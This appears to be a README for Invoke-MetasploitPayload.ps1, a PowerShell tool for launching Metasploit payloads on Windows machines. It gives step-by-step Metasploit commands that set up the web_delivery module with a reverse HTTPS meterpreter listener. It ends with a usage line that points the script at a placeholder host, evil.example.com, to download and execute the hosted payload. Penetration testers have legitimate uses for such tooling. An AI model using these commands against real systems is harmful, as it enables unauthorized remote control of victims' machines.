<h2 align="center">Invoke-MetasploitPayload.ps1</h2>
Invoke-MetasploitPayload is a Powershell script used to kick off a Metasploit payload. It relies on the exploit/multi/scripts/web_delivery Metasploit module.

#### The exploit/multi/scripts/web_delivery module
The web_delivery module generates a script for a given payload and then fires up a webserver to host said script. If the payload is a reverse shell, it will also handle starting up the listener for that payload. 

#### Example Usage
On your Metasploit instance, run the following commands

```
use exploit/multi/script/web_delivery
```
The SRVHOST and SRVPORT variables are used for running the webserver to host the script
```
set SRVHOST 0.0.0.0
set SRVPORT 8443
set SSL true
```
The `target` variable determines what type of script we're using. `2` is for PowerShell
```
set target 2
```
Pick your payload. In this case, we'll use a reverse https meterpreter payload
```
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
```
Run the exploit
```
run -j
```

Once run, the web_delivery module will spin up the webserver to host the script and reverse listener for our meterpreter session.
#### Getting the Payload URL
After running the web_delivery module, it will print out the URL for the webserver hosting the script file. This will typically look like `http://[IP_OF_METASPLOIT_INSTANCE]/[RANDOM CHARACTERS]`. This URL is what you'll pass to `Invoke-MetasploitPayload`. _You can ignore the line about "Run the following command on the target machine"_

![Web Delivery Example](/web_delivery_screenshot.png)

#### Using Invoke-Metasploit.ps1

Usage is simple, just pass the URL from the web_delivery module. Invoke-MetasploitPayload will handle spinning up a new process and then downloading and executing the script.

```
PS> Invoke-MetasploitPayload -url "http://evil.example.com/SDFJLWKS"
```
